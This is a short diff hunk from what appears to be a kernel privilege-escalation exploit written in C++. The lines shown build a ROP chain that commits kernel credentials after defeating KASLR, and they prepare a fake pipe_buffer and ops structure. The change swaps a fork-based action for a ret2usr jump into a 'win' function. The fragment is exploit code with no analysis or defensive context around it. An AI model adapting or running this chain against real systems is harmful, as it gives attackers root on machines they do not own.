@@ -92,7 +92,8 @@ int main(int argc, const char** argv) {
     printf("[+] ROP chain:\n");
     RopChain rop(kaslr_base);
     target.AddRopAction(rop, RopActionId::COMMIT_KERNEL_CREDS);
-    target.AddRopAction(rop, RopActionId::TELEFORK, {1000});
+    RopUtils::Ret2Usr(target, rop, (void*)win);
+    rop.Add(0xffffffff41414141);
     HexDump::Print(rop.GetData());
 
     printf("[+] Preparing fake pipe_buffer and ops\n");
